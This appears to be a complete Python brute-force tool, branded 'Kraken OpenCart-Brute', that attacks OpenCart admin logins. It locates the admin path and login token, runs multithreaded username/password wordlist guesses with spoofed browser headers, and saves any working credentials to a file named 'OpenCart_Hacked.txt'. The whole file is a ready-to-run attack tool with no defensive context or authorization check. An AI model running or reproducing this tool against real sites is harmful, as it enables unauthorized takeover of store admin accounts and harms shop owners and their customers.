import os
import sys
import re
import requests
import logging
from colorama import Fore, Style, init
from random import choice
from threading import Thread, Lock
from queue import Queue
import pyfiglet


init(autoreset=True)


logging.basicConfig(filename=os.path.join('Logs', 'opencart_brute_debug.log'),
                    level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.realpath(__file__))
results_dir = os.path.join(script_dir, 'Results')
logs_dir = os.path.join(script_dir, 'Logs')
wordlists_dir = os.path.join(script_dir, "..", "wordlists")


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


output_lock = Lock()

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    try:
        colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
        banner_color = choice(colors)
        banner = pyfiglet.figlet_format("Kraken OpenCart-Brute", font="slant")
        print(Style.BRIGHT + banner_color + banner)
        print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")
    except ImportError:
        print("Kraken OpenCart-Brute\n" + "="*80 + "\n")

def status(msg):
    """Prints status messages."""
    with output_lock:
        print(Fore.CYAN + "[*] " + msg)

def success(msg):
    """Prints success messages."""
    with output_lock:
        print(Fore.GREEN + "[+] " + msg)

def error(msg):
    """Prints error messages."""
    with output_lock:
        print(Fore.RED + "[-] " + msg)

class OpenCartBruteForce:
    def __init__(self):
        clear_console()
        display_banner()

        self.site, self.usernames, self.passwords, self.num_threads = self.get_user_input()
        self.queue = Queue()
        self.threads = []
        self.total_attempts = len(self.usernames) * len(self.passwords)
        self.attempt_number = 0

        
        self.admin_path, self.login_token = self.detect_admin_path()

        if not self.admin_path:
            self.admin_path = self.prompt_for_admin_path()

        
        for username in self.usernames:
            for password in self.passwords:
                self.queue.put((username, password))

        
        for _ in range(self.num_threads):
            t = Thread(target=self.worker)
            t.start()
            self.threads.append(t)

        
        self.queue.join()
        print('\n')
        success("[Completed] All password attempts finished.")

    def get_user_input(self):
        """Gathers user input for the OpenCart brute force operation."""
        site = input(Fore.WHITE + '[i] Enter the target: ').strip()
        if not site.startswith(('http://', 'https://')):
            site = 'http://' + site
        site = site.rstrip('/')

        use_username_list = input(Fore.WHITE + "[i] Use username list? (Y/n): ").strip().lower()
        if use_username_list != 'n':
            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "users.txt")
            status(f"Loading usernames from {user_file}...")
            if not os.path.isfile(user_file):
                error(f"Username list not found: {user_file}")
                logging.error(f"Username list not found: {user_file}")
                sys.exit(1)
            with open(user_file, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f if line.strip()]
            if not usernames:
                error("No usernames found in the list.")
                logging.error("No usernames found.")
                sys.exit(1)
            success(f"{len(usernames)} usernames loaded from the list.")
        else:
            username = input(Fore.WHITE + "[i] Enter username: ").strip()
            if not username:
                error("No username provided.")
                logging.error("No username provided.")
                sys.exit(1)
            usernames = [username]
            success(f"Username entered manually: {username}")

        passwordlist = input(Fore.WHITE + "[i] Password list (default: passwords.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "passwords.txt")
        status(f"Loading passwords from {passwordlist}...")
        if not os.path.isfile(passwordlist):
            error(f"Password list not found: {passwordlist}")
            logging.error(f"Password list not found: {passwordlist}")
            sys.exit(1)
        with open(passwordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        success(f"{len(passwords)} passwords loaded.")

        num_threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)

        status("All inputs received successfully.")
        print(Fore.YELLOW + "-"*60)
        print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
        return site, usernames, passwords, num_threads

    def detect_admin_path(self):
        """Detects the correct admin path by checking common paths and looking for specific OpenCart indicators."""
        potential_paths = ['/administration', '/admin']
        for path in potential_paths:
            response = requests.get(f'{self.site}{path}', timeout=10)
            logging.debug(f"Checking path: {self.site}{path} - Status Code: {response.status_code}")
            if response.status_code == 200:
                form_action_match = re.search(r'<form[^>]+action=["\']([^"\']*route=common/login.login[^"\']*)["\']', response.text)
                if form_action_match:
                    login_token = re.search(r'login_token=([a-z0-9]+)', form_action_match.group(1)).group(1)
                    success(f"Admin path found: {path}")
                    logging.debug(f"Admin path found: {path} with login token: {login_token}")
                    return path, login_token
        return None, None

    def prompt_for_admin_path(self):
        """Prompts the user to enter the admin path if not found automatically."""
        admin_path = input(Fore.WHITE + '[i] Admin path not found. Please enter the admin path or full URL: ').strip()
        if admin_path.startswith(('http://', 'https://')):
            return admin_path  
        if not admin_path.startswith('/'):
            admin_path = '/' + admin_path
        return admin_path

    def worker(self):
        """Thread worker function to process the queue."""
        while not self.queue.empty():
            username, password = self.queue.get()
            self.opencart(username, password)
            self.queue.task_done()

    def opencart(self, username, password):
        """Attempts to log in to the OpenCart admin site using provided credentials."""
        try:
            sess = requests.session()

            
            response = sess.get(f'{self.site}{self.admin_path}/index.php?route=common/login', timeout=10)
            logging.debug(f"Login page response: {response.status_code}, Headers: {response.headers}")

            
            form_action = re.search(r'action="([^"]+)"', response.text)
            if form_action:
                login_url = form_action.group(1)
                logging.debug(f"Form action URL: {login_url}")
            else:
                error("Failed to find the login form action URL.")
                return

            post_data = {
                'username': username,
                'password': password,
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': self.site,
                'Referer': f'{self.site}{self.admin_path}/index.php?route=common/login'
            }

            self.attempt_number += 1  

            
            logging.debug(f"Attempting login with URL: {login_url} and data: {post_data}")
            response = sess.post(login_url, data=post_data, headers=headers, timeout=10)

            logging.debug(f"Response Status Code: {response.status_code}")
            logging.debug(f"Response Headers: {response.headers}")
            logging.debug(f"Response Text: {response.text[:200]}...")  

            
            if "dashboard" in response.text.lower() or "user_token" in response.text.lower():
                success_msg = (
                    f"\n[{self.attempt_number}/{self.total_attempts}] Tested - {username}:{password}\n"
                    f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                    f"URL: {Fore.CYAN}{self.site}{self.admin_path}\n"
                    f"Username: {Fore.CYAN}{username}\n"
                    f"Password: {Fore.CYAN}{password}\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                )
                sys.stdout.write('\033[K')  
                print(success_msg)
                with open(os.path.join(results_dir, 'OpenCart_Hacked.txt'), 'a') as writer:
                    writer.write(success_msg)
            else:
                
                percentage = (self.attempt_number / self.total_attempts) * 100
                sys.stdout.write(Fore.MAGENTA + f"\r[{self.attempt_number}/{self.total_attempts}] Tested - {percentage:.2f}% | Current: {username}:{password}" + " " * 10)
                sys.stdout.flush()

        except Exception as e:
            logging.error(f"Login attempt error: {str(e)}")

def main():
    OpenCartBruteForce()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")
